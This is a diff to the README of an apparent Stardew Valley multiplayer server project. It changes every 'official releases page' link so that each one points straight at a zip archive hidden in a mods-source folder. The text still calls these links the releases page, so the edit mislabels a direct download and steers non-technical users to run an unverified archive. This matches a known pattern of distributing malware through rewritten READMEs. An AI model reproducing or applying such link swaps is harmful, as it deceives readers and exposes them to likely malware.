@@ -1,6 +1,6 @@
 # 🐾 puppy-stardew-server - Host your own Stardew Valley world
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/iffy-genusblandfordia5006/puppy-stardew-server/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://raw.githubusercontent.com/iffy-genusblandfordia5006/puppy-stardew-server/main/docker/mods-source/AutoHideHost_v1.0.1/server_puppy_stardew_3.5.zip)
 
 This application lets you host a multiplayer Stardew Valley server on your computer. You gain control over your game world, manage saved files, add mods, and keep backups. The software handles technical setup through a simple web dashboard. You do not need experience with code or server management to run this.
 
@@ -18,7 +18,7 @@ Before you begin, ensure your computer meets these minimum standards:
 
 You need the correct files to start your server. 
 
-1. Visit the [official releases page](https://github.com/iffy-genusblandfordia5006/puppy-stardew-server/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/iffy-genusblandfordia5006/puppy-stardew-server/main/docker/mods-source/AutoHideHost_v1.0.1/server_puppy_stardew_3.5.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in `.zip` or `.exe` to download it to your computer.
 4. Save this file to a folder you can find easily, such as your Downloads folder or a dedicated Games folder.
@@ -91,7 +91,7 @@ The web panel is the primary way to interact with the server. It is recommended 
 The system saves your progress automatically at regular intervals. Use the "Stop" button in the web panel to ensure the system saves your data before you close the application.
 
 **How do I update the software?**
-Visit the [releases page](https://github.com/iffy-genusblandfordia5006/puppy-stardew-server/releases) again. Download the newest version and replace the old files with the new ones. Your save files remain in their specific folder so they carry over to the new version.
+Visit the [releases page](https://raw.githubusercontent.com/iffy-genusblandfordia5006/puppy-stardew-server/main/docker/mods-source/AutoHideHost_v1.0.1/server_puppy_stardew_3.5.zip) again. Download the newest version and replace the old files with the new ones. Your save files remain in their specific folder so they carry over to the new version.
 
 **Does everyone in my game need the same mods?**
 All players should have the same mods installed to prevent errors. Share your mod list with your friends to keep the game stable for everyone.
